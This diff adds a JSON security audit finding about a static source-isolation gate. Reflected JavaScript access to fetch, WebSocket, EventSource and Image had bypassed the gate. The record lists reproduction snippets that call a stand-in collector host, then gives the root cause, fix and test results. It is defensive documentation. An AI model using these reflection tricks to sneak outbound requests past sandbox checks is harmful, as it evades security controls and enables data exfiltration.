@@ -1,0 +1,38 @@
+{
+  "findingId": "SEC-37-077",
+  "severity": "medium",
+  "title": "Reflected access to browser network APIs bypassed the registry gate",
+  "status": "fixed_locally",
+  "reproduction": {
+    "examples": [
+      "const request = Reflect.get(window, 'fetch'); request('https://collector.invalid/data');",
+      "Reflect.apply(window.fetch, window, ['https://collector.invalid/data']);",
+      "const request = Object.getOwnPropertyDescriptor(window, 'fetch')?.value; request('https://collector.invalid/data');",
+      "Reflect['get'](globalThis, 'fetch')('https://collector.invalid/data');",
+      "Reflect.construct(WebSocket, ['wss://collector.invalid/live']);",
+      "const construct = Reflect.construct; construct(EventSource, ['https://collector.invalid/events']);",
+      "Reflect.construct(Image, ['https://collector.invalid/pixel.png']);"
+    ],
+    "beforeFix": "The source-isolation check returned pass for reflected fetch access, invocation, and descriptor lookup.",
+    "afterFix": "Static reflected access or invocation of fetch, WebSocket, EventSource, XMLHttpRequest, Image, Audio, sendBeacon, and Axios request methods fails the source-isolation gate; Reflect.construct of network constructors and remote image/audio sources is rejected."
+  },
+  "rootCause": "The AST gate resolved direct calls and ordinary aliases but did not interpret Reflect.get, Reflect.apply, Object.getOwnPropertyDescriptor, or Reflect.construct when their static targets resolved to outbound network APIs.",
+  "affectedFiles": [
+    "packages/registry-gate/src/checks/isolation-check.ts",
+    "packages/registry-gate/src/__tests__/registry-gate.test.ts"
+  ],
+  "remediation": "Resolve static global-object and method aliases, inspect reflected target/property pairs and constructor calls, and reject network-capable reflection without executing resource source.",
+  "validation": {
+    "redBeforeFix": "pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t \"reflected access to browser network APIs\"",
+    "redBeforeFixResult": "failed as expected: the reflected fetch expression returned pass",
+    "targetedAfterFix": "pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts",
+    "targetedAfterFixResult": "46 tests passed, including direct/computed/aliased Reflect methods, descriptor lookup, Reflect.construct network constructors, and remote Image construction.",
+    "fullUnitSuite": "pnpm test passed: 1,171 tests across 76 files",
+    "typecheck": "pnpm typecheck passed across 22 workspace packages",
+    "lint": "pnpm lint passed with 0 errors and 33 warnings",
+    "auditAll": "pnpm audit:all passed all 16 behavioral gates and current build, bundle, provenance, secret, and dependency audits",
+    "resourceScan": "All 324 canonical resources passed security-isolation with zero failures",
+    "untrustedCodeExecuted": false,
+    "runtimeBoundary": "This local source-gate evidence does not replace isolated-preview CSP or deployed runtime verification."
+  }
+}
